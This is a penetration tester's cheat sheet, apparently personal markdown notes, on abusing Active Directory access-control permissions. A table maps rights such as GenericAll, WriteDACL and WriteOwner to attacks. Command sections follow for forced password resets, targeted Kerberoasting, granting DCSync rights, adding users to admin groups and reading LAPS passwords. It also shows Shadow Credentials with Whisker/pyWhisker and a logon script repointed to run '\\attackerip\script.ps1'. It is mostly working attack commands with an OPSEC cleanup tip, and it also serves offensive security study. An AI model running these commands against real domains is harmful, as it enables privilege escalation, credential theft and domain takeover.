---
title: DACL Abuse
tags:
  - dacl
  - activedirectory
---

# ACLs Abuse Table

| ACL/ACE                                                                               | Object   | Permission                          | Abuse                                                                                        | ScreenShot                          |
| ------------------------------------------------------------------------------------- | -------- | ----------------------------------- | -------------------------------------------------------------------------------------------- | ----------------------------------- |
| **GenericAll**                                                                        | User     | Full rights                         | - [[#Force Change User Password]]<br>- [[#Targeted Kerberoast]]<br>- [[#Shadow Credentials]] | ![](GenericAll_user.PNG)            |
| **GenericAll**                                                                        | Group    | Full rights                         | [[#Add Users to Group]]                                                                      | ![](GenericAll_Group.PNG)           |
| **GenericAll**                                                                        | Computer | Full rights                         | [[RBCD\|resource-based constrained delegation]]                                              | ![](GenericAll_Computer.PNG)        |
| **GenericWrite\WriteProperty**                                                        | User     | Write/update object's attributes    | - [[#Targeted Kerberoast]]<br>- [[#Overwrite Logon Script]]                                  | ![](GenericWrite.PNG)               |
| **GenericWrite**                                                                      | Group    | Ability to self add to group        | - [[#Add Users to Group]]                                                                    | ![](GenericWrite_Group.PNG)         |
| **GenericWrite<br>WriteProperty**                                                     | Computer | Write/update object's attributes    | - [RBCD](#resource-based-constrained-delegation)                                             |                                     |
| **GenericWrite</br>AllExtendedWrite</br>GenericAll</br>WriteOwner</br>WriteProperty** | GPO      | Write object's properties           | - [[[Add self to local admin](#gpo-abuse-with-powerview)]]                                   |                                     |
| **WriteDACL**                                                                         | Domain   | modify object's ACE (full control)  | - [[#Add DCSync Privilege to object]]                                                        |                                     |
| **WriteOwner**                                                                        | User     | change owner/password               | - [[#Change password with credential\|Change User's Password with Credential]]               |                                     |
| **Self-Membership/Self**                                                              | Group    | ability to add ourself to the group | - [[#Add Users to Group\|Self Add to Group]]                                                 |                                     |
| **ExtendedRights**                                                                    | User     | change user's password              | - [[#Force Change User Password]]                                                            | ![](AllExtendedRights.PNG)          |
| **ExtendedRights**                                                                    | Group    | Read LAPS Password                  | - [[#Read LAPS]]                                                                             |                                     |
| **User-Force-Change-Password**                                                        | User     | change user's password              | - [[#Force Change User Password]]                                                            | ![](Force-Change-User-Password.PNG) |
# ACLs/ACEs Abuse
### Force Change User Password

>[!note]
>This doesn't require you to know the owned user's credential

```powershell
# PowerView
Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
```

### Change password with credential
_Note: Need to know owned user's password_
```powershell
# Create PSCredential Object
$username='contoso\administrator'
$password=ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!'
$cred = New-Object System.Management.Automation.PSCredential($username,$password)

# Change password with PSCredential
Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'password123!') -Credential $cred
```

### Targeted Kerberoast
This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
```powershell
# Set SPN
## Windows
Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my/sqlspn'}

# Clear SPN (OPSEC)
Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
```

There is also a repo [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to automatically discover ACLs from the current user context against other domain objects looking for _Write_ permission on `servicePrincipalName` attribute. 
```bash
python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
```

### Add DCSync Privilege to object
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
```

### Add Users to Group
This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
```powershell
# PowerView
Add-DomainGroupMember -Identity cadmins -Members lowpriv

# net.exe
net.exe group 'cadmins' lowpriv /add /domain
```

### Overwrite Logon Script
Logon Script will run everytime user logged in._(note: use ad module)_
```powershell
Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue "\\attackerip\script.ps1"
```

### Read LAPS
This will only possible if you have _AllExtendedRights_ permission on a computer object.
```powershell
# PowerView
Get-DomainComputer -Properties ms-mcs-admpwd
Get-DomainComputer -LAPS
```

### Shadow Credentials
There is an attribute called `msDS_KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has a matching private key, and a TGT will be sent if there is a match. The attribute could be controlled if the controlled account has a privilege to write on the account attributes. 
```bash
# Whisker
Whisker.exe add /target:lowpriv /domain:range.net /dc:192.168.86.182 /path:cert.pfx /password:"pfx-password"

# pyWhisker (list certificates)
py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --action list

# pyWhisker (modify msDS-KeyCredentialLink)
py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --action add
```

Once you have obtained the certificate, it can further use the [Pass-The-Certificate](#pass-the-certificate) attack to authenticate. 

> [!References]
>- https://pentestlab.blog/2022/02/07/shadow-credentials/
>- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
>- https://github.com/ShutdownRepo/pywhisker
>- https://github.com/eladshamir/Whisker